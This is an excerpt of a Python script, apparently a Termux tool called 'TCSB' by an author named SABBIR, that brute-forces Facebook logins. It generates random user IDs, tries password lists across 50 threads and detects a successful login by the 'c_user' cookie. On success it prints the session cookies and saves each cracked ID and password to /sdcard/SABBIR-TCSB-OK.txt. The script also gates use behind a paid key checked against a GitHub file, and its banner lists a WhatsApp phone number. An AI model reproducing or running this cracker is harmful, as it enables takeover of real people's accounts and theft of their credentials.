...
print('\n\033[1;37m install modules....\n It will take some seconds... TCSB  W8 update Tool..')
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/SABBIR6T9/Kay5/tree/main').text
        ff=open('show.txt','w')
...
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
\033[1;93m┌━━━━━━━━━━━━━━━━━━\033[1;37m ━━━━━━━━━━━━━━━━━━━━┐
\033[1;37m│ ❲★❳ AUTHOR   𝐒𝐀𝐁𝐁𝐈𝐑          │ 
\033[1;37m│ ❲★❳ GITHUB   : 𝐒𝐀𝐁𝐁𝐈𝐑𝟔𝐓𝟗             |
\033[1;37m│ ❲★❳ WHATSAPP : +𝟖𝟖 𝟎𝟏𝟕𝟕𝟔𝟐𝟒𝟑𝟕𝟏𝟓        │
...
def main():
    ...
    if sh =='5':
       ...
       menu()
    if sh =='6':
       os.system('xdg-open https://www.facebook.com/profile.php?id=SABBIR6T9090')
       main()  
...
def random_apk():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SABBIR-TCSB-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : SABBIR-TCSB-CP.txt  ")
...
def random_gmail():
    ...
    print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
    print(f"  {K}EXAMPLE : \033[1;97mRakib , SABBIR , Mehedi , Sumaiya , Ridoy") 
...
def apk(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[SABBIR] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/SABBIR-TCSB-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
        ...
        loop+=1
        sys.stdout.write(f'\r\033[m[SABBIR] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}SABBIR{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
...
def mix(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/SABBIR-TCSB-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [SABBIR>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/SABBIR-TCSB-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
...
def approval():
  ...
  id = "4h".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/SABBIR6T9/Kay5/blob/main/Key5.txt').text
    if id in httpCaht:
      print("\33[1;32mYour Token is Successfully Approved")
      print('\033[1;93mYour Token is Successfully Approved ')
      psb('\033[1;97m[\033[92;1m•\033[1;97m]\033[1;97mYOUR KEY DONE PAID USER ADMIN PERMISSION MD SABBIR ')
      msg = str(os.geteuid())
      time.sleep(0.03)
      print()
      pass
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801776243715?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
